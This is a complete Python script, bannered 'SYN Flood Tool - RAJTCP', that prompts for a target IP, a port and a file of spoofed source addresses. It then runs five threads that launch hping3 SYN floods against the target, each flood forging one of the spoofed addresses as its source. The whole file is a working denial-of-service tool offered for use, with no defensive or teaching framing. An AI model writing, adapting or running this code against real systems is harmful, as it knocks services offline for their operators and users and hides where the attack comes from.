import subprocess
import threading
import signal
import sys
import queue

# global queue to store tasks and threads
task_queue = queue.Queue()
threads = []
hping_processes = []

def print_banner():
    banner = """
██████╗  █████╗      ████████╗ ██████╗██████╗  ██████╗
██╔══██╗██╔══██╗     ╚══██╔══╝██╔════╝██╔══██╗██╔═══██╗
██║  ██║███████║        ██║   ██║     ██████╔╝██║   ██║
██║  ██║██╔══██║        ██║   ██║     ██╔═══╝ ██║   ██║
██████╔╝██║  ██║        ██║   ╚██████╗██║     ╚██████╔╝
╚═════╝ ╚═╝  ╚═╝        ╚═╝    ╚═════╝╚═╝      ╚═════╝ 
                  SYN Flood Tool - RAJTCP
    """
    print(banner)

def syn_flood_worker(ip, port):
    while not task_queue.empty():
        spoofed_ip = task_queue.get()
        cmd = ["hping3", "--flood", "-S", "-p", port, ip, "-a", spoofed_ip]
        
        print(f"[INFO] Sending flood to {ip} from spoofed IP {spoofed_ip}...")
        process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        hping_processes.append(process)
        
        process.wait()  # wait until the process finishes before continuing
        task_queue.task_done()

def signal_handler(sig, frame):
    print("\n[INFO] Detected interrupt, stopping all processes...")
    
    # terminate all running hping3 processes
    for process in hping_processes:
        process.terminate()
    
    print("[INFO] All processes stopped.")
    sys.exit(0)

def main():
    print_banner()  # display banner
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    ip_target = input("Enter target IP: ")
    port_target = input("Enter target port: ")
    spoofed_file = input("Enter spoofed IP list file: ")
    
    try:
        with open(spoofed_file, "r") as file:
            spoofed_ips = [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print("Spoofed IP list file not found!")
        return

    # add all spoofed IPs to the queue
    for ip in spoofed_ips:
        task_queue.put(ip)
    
    thread_count = 5  # limit number of threads to avoid overload
    
    # create and start threads
    for _ in range(thread_count):
        t = threading.Thread(target=syn_flood_worker, args=(ip_target, port_target))
        threads.append(t)
        t.start()

    # wait for all threads to complete
    for t in threads:
        t.join()

    print("[INFO] All processes completed.")

if __name__ == "__main__":
    main()
